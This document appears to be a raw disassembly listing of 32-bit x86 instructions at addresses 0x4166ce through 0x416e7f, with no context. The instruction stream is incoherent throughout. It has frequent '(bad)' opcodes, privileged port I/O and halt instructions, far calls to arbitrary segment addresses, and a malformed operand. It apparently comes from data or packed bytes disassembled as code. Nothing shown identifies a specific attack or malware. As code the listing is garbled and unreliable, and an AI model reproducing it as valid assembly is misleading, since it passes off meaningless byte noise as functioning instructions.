  4166ce:	pop    edi
  4166cf:	jne    0x4166a5
  4166d1:	ret    
  4166d2:	xchg   BYTE PTR [eax+0x3f],ah
  4166d5:	jo     0x41670d
  4166d7:	jp     0x416669
  4166d9:	cwd    
  4166db:	test   edx,esp
  4166dd:	fist   DWORD PTR [ebx]
  4166df:	ja     0x416737
  4166e1:	std    
  4166e2:	(bad)  
  4166e3:	mov    ds:0x68343c84,eax
  4166e8:	xor    DWORD PTR [ebx],0x7558cc38
  4166ee:	pop    esi
  4166ef:	int    0x2e
  4166f1:	int3   
  4166f2:	test   BYTE PTR [eax*8+0x364e0531],dh
  4166f9:	pusha  
  4166fa:	std    
  4166fb:	aaa    
  4166fc:	(bad)  
  4166fd:	in     eax,dx
  4166fe:	adc    dh,al
  416700:	cmp    BYTE PTR [ecx],dl
  416702:	xor    edi,DWORD PTR [ecx]
  416704:	xchg   ecx,edx
  416706:	push   0x45
  416708:	les    ebx,FWORD PTR ds:0xc3d0500f
  41670e:	inc    ebx
  41670f:	push   eax
  416710:	scas   eax,DWORD PTR es:[edi]
  416711:	mov    eax,0xe8ad96bf
  416716:	mov    ah,0x63
  416718:	es inc edi
  41671a:	scas   al,BYTE PTR es:[edi]
  41671b:	jge    0x4166ce
  41671d:	lea    edi,[esp+ebx*1-0x26e1ccf1]
  416724:	aas    
  416725:	fwait
  416726:	ins    DWORD PTR es:[edi],dx
  416727:	jae    0x416745
  416729:	inc    cl
  41672b:	pusha  
  41672c:	(bad)  
  41672d:	mov    bl,0xb3
  41672f:	mov    bl,0x5a
  416731:	or     al,BYTE PTR [edx-0x74]
  416734:	aad    0x8d
  416736:	add    DWORD PTR [edi-0x74],esi
  416739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41673a:	mov    ds:0x46c3a493,eax
  41673f:	das    
  416740:	nop
  416741:	clc    
  416742:	add    al,0x5f
  416744:	xchg   ecx,eax
  416745:	pop    esp
  416746:	lods   eax,DWORD PTR ds:[esi]
  416747:	xchg   DWORD PTR [esi-0x7e3faeec],ebx
  41674d:	inc    esi
  41674e:	cmp    esi,DWORD PTR [edx-0x20d3506d]
  416754:	sbb    ebp,ebp
  416756:	outs   dx,BYTE PTR ds:[esi]
  416757:	cmp    DWORD PTR [ebx-0x2e6f417f],eax
  41675d:	push   esp
  41675e:	mov    ds:0x104eaccd,al
  416763:	dec    esp
  416764:	test   al,0x3d
  416766:	pop    ecx
  416767:	jne    0x4166f3
  416769:	push   ebp
  41676a:	jae    0x4167d1
  41676c:	mov    ah,0x38
  41676e:	or     al,0xc0
  416770:	xchg   ebp,eax
  416771:	lds    edi,FWORD PTR [ecx+0x52]
  416774:	hlt    
  416775:	sbb    eax,0x23136e21
  41677a:	adc    DWORD PTR [ecx+0x51],0x616aa52f
  416781:	test   BYTE PTR [ecx-0x37],dh
  416784:	mov    ds:0xf7ab227e,eax
  416789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41678a:	into   
  41678b:	mov    edi,0xa7381487
  416790:	stos   DWORD PTR es:[edi],eax
  416791:	mov    eax,0x47dbcda8
  416796:	in     al,dx
  416797:	mov    al,bl
  416799:	inc    BYTE PTR [esi+0x7128faa1]
  41679f:	int3   
  4167a0:	outs   dx,DWORD PTR ds:[esi]
  4167a1:	mov    WORD PTR [edi],ds
  4167a3:	add    cl,BYTE PTR [edi+eax*4+0x3d]
  4167a7:	retf   
  4167a8:	adc    eax,0xb4eddce7
  4167ad:	rcr    DWORD PTR [esp+ecx*4+0x4c],1
  4167b1:	mov    bh,0xef
  4167b3:	adc    eax,0xfed3b05a
  4167b8:	push   0x38
  4167ba:	add    ah,BYTE PTR [edi]
  4167bc:	mov    edx,0x1072d50f
  4167c1:	push   eax
  4167c2:	xor    BYTE PTR [esi-0x2c843ea9],bl
  4167c8:	xchg   ebx,eax
  4167c9:	cli    
  4167ca:	ficomp DWORD PTR [edx+0x75c56d59]
  4167d0:	mov    dl,0xee
  4167d2:	sub    eax,0x571cc27
  4167d7:	gs je  0x41680a
  4167da:	cmc    
  4167db:	sbb    al,0x62
  4167dd:	pushf  
  4167de:	or     DWORD PTR [esp+esi*4-0x1f],ebx
  4167e2:	and    BYTE PTR [eax-0x1a185aa1],bh
  4167e8:	ficomp WORD PTR [ebx+0x7c]
  4167eb:	or     ah,BYTE PTR [ecx+0x1c0f220a]
  4167f1:	ret    
  4167f2:	mov    edx,0xfbb9390e
  4167f7:	adc    edx,DWORD PTR [eax+0xc]
  4167fa:	ja     0x41683a
  4167fc:	hlt    
  4167fd:	in     eax,dx
  4167fe:	inc    ebp
  4167ff:	leave  
  416800:	mov    dh,BYTE PTR ss:[ebx+0x7e]
  416804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416805:	adc    DWORD PTR [ebx],0x7e
  416808:	sbb    DWORD PTR [edi],ebp
  41680a:	mov    esp,0x4ee6ae89
  41680f:	adc    eax,0x68430c79
  416814:	fwait
  416815:	int3   
  416816:	fidiv  DWORD PTR [edx-0x7]
  416819:	test   BYTE PTR ds:[edx],ah
  41681c:	add    al,0xbe
  41681e:	and    al,0x2c
  416820:	lds    ebp,FWORD PTR [ebx+0x4d3d6c4b]
  416826:	dec    esp
  416827:	(bad)
  41682a:	push   esp
  41682b:	pop    ds
  41682c:	or     ebx,DWORD PTR [ebx+ebx*2]
  41682f:	jmp    0x57c8306f
  416834:	jl     0x4167c5
  416836:	sahf   
  416837:	xor    al,0xf5
  416839:	and    dl,BYTE PTR [ecx]
  41683b:	mov    gs:0x49f632a0,eax
  416841:	mov    es,WORD PTR [edx+0x35de33c4]
  416847:	mov    al,0x7a
  416849:	xor    ebx,DWORD PTR [ebx]
  41684b:	mul    ah
  41684d:	pop    ebx
  41684e:	jmp    0x8fcd93b5
  416853:	sbb    ebp,DWORD PTR [edi]
  416855:	xchg   edi,eax
  416856:	repz cmp ah,BYTE PTR [edx]
  416859:	fmul   DWORD PTR [eax-0x13]
  41685c:	(bad)  
  41685d:	fs dec eax
  41685f:	shl    BYTE PTR [edi+0x15],1
  416862:	rol    esp,1
  416864:	cld    
  416865:	iret   
  416866:	loopne 0x4168d2
  416868:	sbb    dl,BYTE PTR [esi-0x76f3d88b]
  41686e:	push   es
  41686f:	xor    BYTE PTR [edi-0x39],dl
  416872:	pop    edi
  416873:	cmp    edi,DWORD PTR [ebp+0x5d670bf6]
  416879:	inc    ebx
  41687a:	daa    
  41687b:	dec    esp
  41687c:	sar    BYTE PTR [ebx],cl
  41687e:	cmp    esp,DWORD PTR [eax+ecx*1+0x3dd2154d]
  416885:	add    BYTE PTR [esi-0x27e032f1],bl
  41688b:	shl    cl,cl
  41688d:	ja     0x4168fa
  41688f:	dec    edx
  416890:	cdq    
  416891:	jae    0x4168bf
  416893:	push   esp
  416894:	scas   eax,DWORD PTR es:[edi]
  416895:	mov    ebp,0xc70be994
  41689a:	scas   eax,DWORD PTR es:[edi]
  41689b:	adc    BYTE PTR [ecx+edi*8+0x768fc0c0],bh
  4168a2:	dec    edi
  4168a3:	pusha  
  4168a4:	mov    eax,ds:0xa97af07b
  4168a9:	adc    esp,ebx
  4168ab:	add    bh,bl
  4168ad:	addr16 xor al,0xc0
  4168b0:	jmp    0x4168ee
  4168b2:	pop    ecx
  4168b3:	push   ds
  4168b4:	inc    esi
  4168b5:	repz (bad) 
  4168b7:	out    0xfe,eax
  4168b9:	push   esp
  4168ba:	mov    ds:0x3ab902ab,eax
  4168bf:	push   ebx
  4168c0:	data16 mov WORD PTR fs:[ebp+0x6f700abf],gs
  4168c8:	xchg   DWORD PTR [eax],eax
  4168ca:	call   0x8476a3e0
  4168cf:	push   es
  4168d0:	frstor [ebp-0x6f59ef24]
  4168d6:	into   
  4168d7:	test   DWORD PTR [ebx],ecx
  4168d9:	push   ds
  4168da:	dec    esi
  4168db:	jle    0x416924
  4168dd:	hlt    
  4168de:	pop    esi
  4168df:	or     eax,0x16172f9a
  4168e4:	and    ah,bh
  4168e6:	fs in  al,dx
  4168e8:	push   cs
  4168e9:	jae    0x41693e
  4168eb:	arpl   WORD PTR [eax+0x58],sp
  4168ee:	mov    dl,0xa4
  4168f0:	ja     0x41696d
  4168f2:	test   BYTE PTR [esi+0x7d],dl
  4168f5:	int3   
  4168f6:	icebp  
  4168f7:	out    dx,al
  4168f8:	xchg   esp,eax
  4168f9:	jae    0x416958
  4168fb:	push   ebx
  4168fc:	pop    esp
  4168fd:	mov    BYTE PTR [ecx],ch
  4168ff:	addr16 cs in al,0xfa
  416903:	in     al,dx
  416904:	adc    al,0x99
  416906:	pushf  
  416907:	popa   
  416908:	scas   al,BYTE PTR es:[edi]
  416909:	push   ds
  41690a:	sub    bh,ch
  41690c:	xchg   DWORD PTR [edi+ebp*4],esp
  41690f:	mov    ebp,0x9461c58a
  416914:	push   eax
  416915:	fwait
  416916:	cdq    
  416917:	(bad)  
  416918:	fidivr DWORD PTR [ecx-0x1bb98d25]
  41691e:	pushf  
  41691f:	out    0x76,eax
  416921:	pop    ecx
  416922:	mov    al,0xf
  416924:	dec    DWORD PTR [edi]
  416926:	jo     0x41695e
  416928:	sbb    BYTE PTR [ecx-0x80],cl
  41692b:	retf   0x90e9
  41692e:	xlat   BYTE PTR ds:[ebx]
  41692f:	hlt    
  416930:	mov    edi,0x27ad18d0
  416935:	mov    ebp,esi
  416937:	enter  0x375,0x31
  41693b:	fld    QWORD PTR [eax+0x26]
  41693e:	xchg   edi,eax
  41693f:	pop    ds
  416940:	test   BYTE PTR [ebx],al
  416942:	aad    0xac
  416944:	dec    ebx
  416945:	sbb    al,0xe8
  416947:	inc    edi
  416948:	pop    ss
  416949:	(bad)  
  41694a:	add    DWORD PTR [eax-0x38],ebx
  41694d:	jmp    0x5c804d83
  416952:	cmp    eax,0x4412476d
  416957:	jmp    0xc327279e
  41695c:	pop    esi
  41695d:	push   eax
  41695e:	mov    dl,0x0
  416960:	(bad)  
  416961:	fcmovnu st,st(4)
  416963:	hlt    
  416964:	fild   DWORD PTR [edx+ebp*1]
  416967:	fdiv   QWORD PTR [eax+0x1ec72505]
  41696d:	pop    edi
  41696e:	test   BYTE PTR [eax+0x6ae7499d],ah
  416974:	xor    BYTE PTR [edi-0x2fc83e3b],al
  41697a:	gs sbb dh,ah
  41697d:	nop
  41697e:	jmp    0x4169b5
  416980:	push   esi
  416981:	outs   dx,DWORD PTR ds:[esi]
  416982:	pop    DWORD PTR [eax-0x51cd8bfa]
  416988:	popf   
  416989:	out    0x40,al
  41698b:	frstor [edi-0x1d]
  41698e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41698f:	nop
  416990:	dec    edi
  416991:	sub    edi,eax
  416993:	ja     0x4169b5
  416995:	mov    al,0x78
  416997:	jnp    0x416933
  416999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41699a:	cld    
  41699b:	test   ch,ah
  41699d:	adc    eax,0x84438fcf
  4169a2:	mov    edx,0x7444f029
  4169a7:	sbb    DWORD PTR [bx+di],ebx
  4169aa:	stos   DWORD PTR es:[edi],eax
  4169ab:	test   BYTE PTR [ebx],ch
  4169ad:	mov    ebp,0xcd68f256
  4169b2:	sti    
  4169b3:	test   BYTE PTR [eax-0x6],dh
  4169b6:	push   es
  4169b7:	ret    0xbe3f
  4169ba:	sub    bh,dl
  4169bc:	gs pushf 
  4169be:	pop    ss
  4169bf:	ret    
  4169c0:	mov    eax,ds:0x85d5fb3a
  4169c5:	push   esi
  4169c6:	pop    esp
  4169c7:	call   0xae9a:0xf6cf9ec
  4169ce:	cmp    cl,ch
  4169d0:	lock pop edx
  4169d2:	bound  edx,QWORD PTR [ecx+0x33]
  4169d5:	ret    0xba5b
  4169d8:	mov    cl,0x65
  4169da:	ins    DWORD PTR es:[edi],dx
  4169db:	sar    DWORD PTR [ecx+0x192c4515],1
  4169e1:	vorps  xmm4,xmm4,XMMWORD PTR [ebp+0xbf57a9b]
  4169e9:	leave  
  4169ea:	scas   al,BYTE PTR es:[edi]
  4169eb:	pop    ds
  4169ec:	mov    ecx,0x6da71970
  4169f1:	xor    al,0x3d
  4169f3:	mov    ebx,0x765e1c4b
  4169f8:	xor    esp,DWORD PTR [eax-0x47]
  4169fb:	pushf  
  4169fc:	add    dh,dh
  4169fe:	out    dx,eax
  4169ff:	push   cs
  416a00:	inc    edi
  416a01:	or     DWORD PTR [ecx],edx
  416a03:	xor    ecx,edi
  416a05:	pop    edi
  416a06:	ins    DWORD PTR es:[edi],dx
  416a07:	cmp    esi,DWORD PTR [eax]
  416a09:	xor    bh,BYTE PTR ds:0xfc1a9938
  416a0f:	in     eax,dx
  416a10:	call   0x88e1:0x5d12306b
  416a17:	cmp    eax,0x34967fc3
  416a1c:	test   al,0x64
  416a1e:	xor    DWORD PTR [ebx],edx
  416a20:	fnstsw WORD PTR ds:0xa3dd38e7
  416a26:	aaa    
  416a27:	adc    al,0xba
  416a29:	call   0x6627:0x84a82fe0
  416a30:	push   ss
  416a31:	mov    ebx,0x51dbe4bb
  416a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a37:	adc    al,0x4d
  416a39:	sbb    BYTE PTR [ebx-0x69f97cbc],bl
  416a3f:	out    0x99,al
  416a41:	cld    
  416a42:	adc    eax,DWORD PTR [esi+edx*1-0x7e9b40f2]
  416a49:	mov    dh,0x63
  416a4b:	lods   al,BYTE PTR ds:[esi]
  416a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a4d:	(bad)  
  416a4e:	xor    eax,0xf4e7237e
  416a53:	push   esi
  416a54:	sub    ecx,DWORD PTR [esp+eax*4-0x30e18461]
  416a5b:	les    edx,FWORD PTR [edi-0x4b]
  416a5e:	rol    ebx,cl
  416a60:	sti    
  416a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a62:	aam    0xb
  416a64:	(bad)  
  416a65:	jbe    0x416a24
  416a67:	cmc    
  416a68:	sub    bl,ch
  416a6a:	ret    0x82e7
  416a6d:	es or  al,0x8a
  416a70:	rcl    BYTE PTR [ebp+0x7f],1
  416a73:	push   es
  416a74:	mov    bl,0xfc
  416a76:	(bad)  
  416a77:	add    dh,ah
  416a79:	and    DWORD PTR [ecx+0xe],eax
  416a7c:	jecxz  0x416afa
  416a7e:	mov    bl,0x5e
  416a80:	mov    eax,ds:0x2d5445c6
  416a85:	bound  edi,QWORD PTR [edi+edx*1-0x33]
  416a89:	idiv   BYTE PTR [edx-0x36a9ba15]
  416a8f:	push   0xffffffc5
  416a91:	jp     0x416a6b
  416a93:	push   0x5d
  416a95:	ds xchg esi,eax
  416a97:	dec    edx
  416a98:	dec    ebp
  416a99:	test   DWORD PTR [edx+0xcb06e9e],0xb35d4259
  416aa3:	xchg   edx,eax
  416aa4:	cmp    BYTE PTR [ebp-0x1e5f0132],al
  416aaa:	or     BYTE PTR [ecx+0x26],ch
  416aad:	lds    ecx,FWORD PTR [ebx-0x702e75c]
  416ab3:	xor    eax,0x575cf2fe
  416ab8:	(bad)  
  416ab9:	jmp    0x356b:0xa947c6e7
  416ac0:	clc    
  416ac1:	enter  0xfff0,0xa0
  416ac5:	dec    esi
  416ac6:	jecxz  0x416ab3
  416ac8:	xchg   esp,eax
  416ac9:	xchg   BYTE PTR [ecx],bh
  416acb:	sbb    DWORD PTR ds:[eax],esp
  416ace:	into   
  416acf:	lods   eax,DWORD PTR ds:[esi]
  416ad0:	adc    eax,0x27e51b7d
  416ad5:	int3   
  416ad6:	and    edx,ebp
  416ad8:	repnz bound ecx,QWORD PTR [edi+0x54]
  416adc:	sbb    edx,DWORD PTR [ebx]
  416ade:	popf   
  416adf:	cmp    DWORD PTR ds:0x13277475,eax
  416ae5:	xchg   ebx,eax
  416ae6:	psllw  mm1,QWORD PTR [ecx+0x32]
  416aea:	pop    ss
  416aeb:	loope  0x416b29
  416aed:	fst    QWORD PTR [ecx*2-0x65ae62e7]
  416af4:	ja     0x416b50
  416af6:	cmp    BYTE PTR [edx-0x7e],0xc6
  416afa:	fwait
  416afb:	cwde   
  416afc:	pop    ebx
  416afd:	sbb    esi,DWORD PTR ds:0x47abe680
  416b03:	mov    bl,0x26
  416b05:	out    0x42,al
  416b07:	sub    ebx,esp
  416b09:	jne    0x416af0
  416b0b:	pusha  
  416b0c:	push   es
  416b0d:	xor    DWORD PTR [ecx],ebp
  416b0f:	push   ebx
  416b10:	or     ecx,DWORD PTR [edi-0x46aaeaf7]
  416b16:	mov    ebp,0xd42b10ec
  416b1b:	jo     0x416ac0
  416b1d:	int    0xb6
  416b1f:	mov    ah,dh
  416b21:	sar    edi,1
  416b23:	out    0xd0,al
  416b25:	xlat   BYTE PTR ds:[ebx]
  416b26:	shl    DWORD PTR [ebx-0x2229e354],0xab
  416b2d:	mov    cl,0xe2
  416b2f:	(bad)  
  416b31:	imul   edx,ebx,0x4ff2b60e
  416b37:	and    bh,bl
  416b39:	out    dx,eax
  416b3a:	popa   
  416b3b:	hlt    
  416b3c:	mov    ds:0x75a6a971,al
  416b41:	iret   
  416b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b43:	call   0x3e6a:0xbed5e474
  416b4a:	dec    ebx
  416b4b:	mov    al,ds:0xc2eb3142
  416b50:	aad    0x1c
  416b52:	imul   esp,DWORD PTR [ebx],0x4987cf16
  416b58:	scas   al,BYTE PTR es:[edi]
  416b59:	pop    esp
  416b5a:	adc    eax,0xba5a09a3
  416b5f:	and    dl,BYTE PTR [eax+0x74a13667]
  416b65:	out    0x44,al
  416b67:	mov    edi,0xc0b96021
  416b6c:	mov    bl,0x88
  416b6e:	and    eax,ebx
  416b70:	xor    eax,0x4a96dde5
  416b75:	lods   eax,DWORD PTR ds:[esi]
  416b76:	call   0x2404:0x5939d3e3
  416b7d:	or     edi,edx
  416b7f:	out    0xf1,eax
  416b81:	daa    
  416b82:	loope  0x416b08
  416b84:	retf   0x12bd
  416b87:	cli    
  416b88:	cmp    al,0x77
  416b8a:	stos   BYTE PTR es:[edi],al
  416b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b8c:	cdq    
  416b8d:	sub    DWORD PTR ds:0x414fdc3d,esi
  416b93:	(bad)  
  416b94:	aad    0xc3
  416b96:	or     DWORD PTR [edi-0x5a9ef012],eax
  416b9c:	mov    ch,BYTE PTR [eax-0x34]
  416b9f:	out    0x7a,eax
  416ba1:	jecxz  0x416baf
  416ba3:	addr16 pusha 
  416ba5:	ins    BYTE PTR es:[edi],dx
  416ba6:	jo     0x416bfb
  416ba8:	sbb    DWORD PTR [esi+0x14773193],ebp
  416bae:	pop    esi
  416baf:	push   ecx
  416bb0:	sub    cl,BYTE PTR [edx]
  416bb2:	push   ss
  416bb3:	jp     0x416b7c
  416bb5:	gs cmp eax,edi
  416bb8:	or     ch,dl
  416bba:	sbb    eax,0xb192e7a6
  416bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bc0:	cmp    al,0x52
  416bc2:	adc    BYTE PTR [esi+0x56],0x90
  416bc6:	je     0x416c10
  416bc8:	mov    edx,0xba86b744
  416bcd:	sbb    DWORD PTR [esp+edx*4],ecx
  416bd0:	and    ch,BYTE PTR [ebx-0x5d]
  416bd3:	mov    ch,0x25
  416bd5:	xchg   esp,eax
  416bd6:	adc    eax,0xe4304c01
  416bdb:	enter  0x754f,0xf8
  416bdf:	aad    0x6b
  416be1:	sbb    edx,DWORD PTR [ebp+0x2766c7d6]
  416be7:	mov    esi,0x33f9c1a6
  416bec:	cmc    
  416bed:	sub    al,0x20
  416bef:	outs   dx,DWORD PTR ds:[esi]
  416bf0:	mov    eax,ds:0xd474fa51
  416bf5:	inc    edi
  416bf6:	mov    bl,0xb
  416bf8:	hlt    
  416bf9:	and    DWORD PTR [edx+0x736718c7],eax
  416bff:	add    BYTE PTR [ecx-0x74],cl
  416c02:	imul   esi,DWORD PTR [ebx],0xffffff8e
  416c05:	dec    ebx
  416c06:	retf   
  416c07:	sbb    BYTE PTR [ecx],bl
  416c09:	mov    ds:0x1c93305b,al
  416c0e:	into   
  416c0f:	xchg   esp,eax
  416c10:	xor    BYTE PTR [edx+0x2d9a5394],al
  416c16:	(bad)  
  416c17:	mov    ebx,0x93e6eb29
  416c1c:	aad    0xc8
  416c1e:	pop    ebp
  416c1f:	fwait
  416c20:	shl    al,cl
  416c22:	jbe    0x416bef
  416c24:	test   DWORD PTR [eax],esi
  416c26:	push   ebp
  416c27:	mov    eax,0xfb6b5571
  416c2c:	dec    esp
  416c2d:	mov    al,ds:0xdb5eb7b0
  416c32:	or     eax,eax
  416c34:	dec    eax
  416c35:	add    BYTE PTR [eax],dh
  416c37:	in     al,0xf8
  416c39:	sub    BYTE PTR [eax-0x149dda8d],al
  416c3f:	in     eax,0xf6
  416c41:	call   0x6d72:0x69fae9a4
  416c48:	jns    0x416cb9
  416c4a:	les    edi,FWORD PTR [ebx+0x8]
  416c4d:	pop    eax
  416c4e:	xchg   ebx,eax
  416c4f:	and    BYTE PTR [eax-0x66],bl
  416c52:	jne    0x416bf2
  416c54:	call   0xac34442
  416c59:	mov    esp,eax
  416c5b:	out    0x8,eax
  416c5d:	mov    ebx,0xe2e4535e
  416c62:	retf   
  416c63:	inc    esp
  416c64:	das    
  416c65:	inc    esi
  416c66:	shl    BYTE PTR [di-0x5848],0xf2
  416c6c:	cwde   
  416c6d:	push   ebp
  416c6e:	and    eax,DWORD PTR [ebx+eiz*4+0x21]
  416c72:	call   0xe211a422
  416c77:	mov    ebx,0xeba50db4
  416c7c:	stos   BYTE PTR es:[edi],al
  416c7d:	push   0xfffffff4
  416c7f:	xchg   edx,eax
  416c80:	mov    edx,0xe6910399
  416c85:	dec    esi
  416c86:	int3   
  416c87:	xor    eax,0xecfef99f
  416c8c:	jo     0x416c5f
  416c8e:	popa   
  416c8f:	in     eax,0xe6
  416c91:	aaa    
  416c92:	mov    al,ds:0xd974e1e3
  416c97:	mov    ch,0x2d
  416c99:	popa   
  416c9a:	imul   edi,ebx,0x68ce446f
  416ca0:	mov    ecx,0x51546b36
  416ca5:	add    eax,0xc36eb1c8
  416caa:	mov    ss,edx
  416cac:	fnstcw WORD PTR [edx+0x17]
  416caf:	arpl   WORD PTR [edx],cx
  416cb1:	jmp    0x3781d985
  416cb6:	outs   dx,DWORD PTR ds:[esi]
  416cb7:	mov    ch,0x64
  416cb9:	add    al,0x14
  416cbb:	sbb    bl,BYTE PTR [ecx]
  416cbd:	lock pop esp
  416cbf:	rcr    DWORD PTR [edx+esi*4+0x25],0xc6
  416cc4:	mov    edx,0x105c3252
  416cc9:	retf   
  416cca:	int3   
  416ccb:	int3   
  416ccc:	fsubr  DWORD PTR [ebx-0x47]
  416ccf:	sbb    DWORD PTR [ebx],0x1d892473
  416cd5:	xchg   esp,eax
  416cd6:	call   0x7bb5:0xb06ebe83
  416cdd:	sar    DWORD PTR fs:[edx-0x12],0xf2
  416ce2:	mov    ch,0xc8
  416ce4:	sub    al,0x5
  416ce6:	mov    ebp,ss
  416ce8:	iret   
  416ce9:	mov    al,ds:0x436c254
  416cee:	fidivr DWORD PTR [ebp+0x7d7a7602]
  416cf4:	ins    DWORD PTR es:[edi],dx
  416cf5:	retf   0xe0c1
  416cf8:	push   cs
  416cf9:	jge    0x416cbe
  416cfb:	inc    edi
  416cfc:	cmc    
  416cfd:	add    edx,eax
  416cff:	je     0x416d05
  416d01:	push   ss
  416d02:	add    esp,DWORD PTR ds:0xa8cd00f3
  416d08:	call   0x41c0:0xc78ec375
  416d0f:	stos   DWORD PTR es:[edi],eax
  416d10:	jl     0x416d6f
  416d12:	inc    ebp
  416d13:	sub    BYTE PTR [edx+0x38],dh
  416d16:	sbb    ah,BYTE PTR ds:0x652a013d
  416d1c:	scas   al,BYTE PTR es:[edi]
  416d1d:	or     al,0x5d
  416d1f:	mov    BYTE PTR [esi],bl
  416d21:	push   es
  416d22:	stos   BYTE PTR es:[edi],al
  416d23:	sbb    al,0x64
  416d25:	dec    eax
  416d26:	stos   DWORD PTR es:[edi],eax
  416d27:	repz xchg ebp,eax
  416d29:	inc    esp
  416d2a:	jge    0x416d1a
  416d2c:	push   ds
  416d2d:	xor    al,0x51
  416d2f:	xchg   dl,ah
  416d31:	hlt    
  416d32:	loope  0x416d85
  416d34:	test   BYTE PTR [esi+0x66],al
  416d37:	sub    ch,BYTE PTR [edi-0x5f]
  416d3a:	push   ecx
  416d3b:	out    dx,al
  416d3c:	je     0x416ce2
  416d3e:	dec    eax
  416d3f:	lahf   
  416d40:	mov    ebp,0xea8ba860
  416d45:	(bad)  [esi+0x8833d13]
  416d4b:	adc    DWORD PTR [edx+0x8],0x5
  416d4f:	fild   DWORD PTR [edx]
  416d51:	mov    eax,ds:0x7d71a092
  416d56:	(bad)  
  416d57:	and    BYTE PTR [edi],cl
  416d59:	loopne 0x416db0
  416d5b:	retf   0x1bdd
  416d5e:	dec    ebx
  416d5f:	sar    DWORD PTR [eax],0x46
  416d62:	mov    ah,0xaa
  416d64:	and    DWORD PTR [edx],edi
  416d66:	mov    bh,0x96
  416d68:	sub    bl,ch
  416d6a:	and    ch,ah
  416d6c:	test   BYTE PTR [edx],cl
  416d6e:	mov    edi,es
  416d70:	xchg   esi,eax
  416d71:	jp     0x416dbb
  416d73:	icebp  
  416d74:	xchg   BYTE PTR [ecx],dh
  416d76:	daa    
  416d77:	loop   0x416d42
  416d79:	push   ebx
  416d7a:	daa    
  416d7b:	arpl   WORD PTR [ebx],bp
  416d7d:	or     bh,BYTE PTR [esp+edx*8-0x74]
  416d81:	ins    DWORD PTR es:[edi],dx
  416d82:	out    dx,eax
  416d83:	shl    bl,1
  416d85:	and    ebx,DWORD PTR [eax+0x2c321a72]
  416d8b:	inc    esi
  416d8c:	or     ah,BYTE PTR [ecx-0x2f]
  416d8f:	push   esp
  416d90:	xor    BYTE PTR ds:[edi],dl
  416d93:	xor    DWORD PTR [ecx-0x2edf9576],esi
  416d99:	lea    esi,[ebx-0xb]
  416d9c:	add    al,0x2
  416d9e:	mov    ch,0x50
  416da0:	leave  
  416da1:	int3   
  416da2:	jp     0x416dbc
  416da4:	cld    
  416da5:	stos   BYTE PTR es:[edi],al
  416da6:	bound  esp,QWORD PTR [edi-0x6f]
  416da9:	push   edi
  416daa:	test   eax,0x5b612292
  416daf:	or     BYTE PTR [eax+esi*4],0x2c
  416db3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416db4:	out    dx,al
  416db5:	lahf   
  416db6:	push   ebp
  416db7:	mov    gs,WORD PTR [edx]
  416db9:	jo     0x416d51
  416dbb:	add    cl,BYTE PTR [edx+0x4e2d1412]
  416dc1:	jbe    0x416e0e
  416dc3:	fldlg2 
  416dc5:	ror    BYTE PTR [edi],0x88
  416dc8:	jae    0x416da7
  416dca:	sar    DWORD PTR [ecx+ebp*2+0x45],cl
  416dce:	ret    0x3df2
  416dd1:	push   esp
  416dd2:	fwait
  416dd3:	into   
  416dd4:	gs aas 
  416dd6:	icebp  
  416dd7:	dec    edi
  416dd8:	pop    ecx
  416dd9:	sbb    dl,BYTE PTR [ebp+0x18688788]
  416ddf:	jbe    0x416db3
  416de1:	mov    cl,0xfc
  416de3:	push   ds
  416de4:	imul   esi,DWORD PTR [edx-0x43cc801c],0x15
  416deb:	stos   BYTE PTR es:[edi],al
  416dec:	mov    ecx,0x27d70652
  416df1:	in     eax,dx
  416df2:	mov    dh,BYTE PTR [ecx-0x35]
  416df5:	popa   
  416df6:	ss push esp
  416df8:	sub    al,al
  416dfa:	adc    DWORD PTR [esi+ebp*4],ebp
  416dfd:	test   BYTE PTR [eax-0x2f7b3619],cl
  416e03:	inc    esp
  416e04:	cmp    ebp,edx
  416e06:	pushf  
  416e07:	icebp  
  416e08:	ins    WORD PTR es:[edi],dx
  416e0a:	stos   DWORD PTR es:[edi],eax
  416e0b:	cmp    al,0x1b
  416e0d:	cli    
  416e0e:	dec    ecx
  416e0f:	mov    bl,0xb
  416e11:	setg   BYTE PTR [edi+0x44763b9a]
  416e18:	jl     0x416e58
  416e1a:	dec    edi
  416e1b:	jo     0x416e8e
  416e1d:	retf   0xec59
  416e20:	fnsave [esp+ecx*2-0x25]
  416e24:	or     BYTE PTR [edx],0x61
  416e27:	dec    edi
  416e28:	mov    db2,esi
  416e2b:	hlt    
  416e2c:	mov    WORD PTR [ecx-0x56],?
  416e2f:	arpl   WORD PTR [esi],si
  416e31:	adc    dh,BYTE PTR [edi]
  416e33:	pop    esp
  416e34:	or     al,0xf6
  416e36:	dec    edi
  416e37:	and    cl,BYTE PTR ds:0x1c830a75
  416e3d:	push   cs
  416e3e:	mov    ds:0xfdcb9cf3,eax
  416e43:	pushf  
  416e44:	pop    edx
  416e45:	adc    bh,BYTE PTR [edx+esi*1]
  416e48:	dec    edx
  416e49:	inc    edi
  416e4a:	inc    ebp
  416e4b:	nop
  416e4c:	std    
  416e4d:	add    esi,DWORD PTR [edx]
  416e4f:	repnz shl DWORD PTR [edi+0x1bcadf44],1
  416e56:	sub    esi,DWORD PTR [esi+0x54]
  416e59:	out    0x3e,al
  416e5b:	pop    ecx
  416e5c:	pop    esi
  416e5d:	call   0xc20a:0xd55ae2ae
  416e64:	in     eax,dx
  416e65:	sub    eax,0x4f04b53a
  416e6a:	cmc    
  416e6b:	scas   al,BYTE PTR es:[edi]
  416e6c:	aas    
  416e6d:	and    eax,DWORD PTR [edx-0x49]
  416e70:	or     ebp,esp
  416e72:	(bad)  
  416e74:	pusha  
  416e75:	data16 loopne 0x416e58
  416e78:	add    al,0x57
  416e7a:	add    al,0xe6
  416e7c:	and    edx,DWORD PTR [ebx+0x18]
  416e7f:	mov    gs,WORD PTR [esi+0x5778cb92]
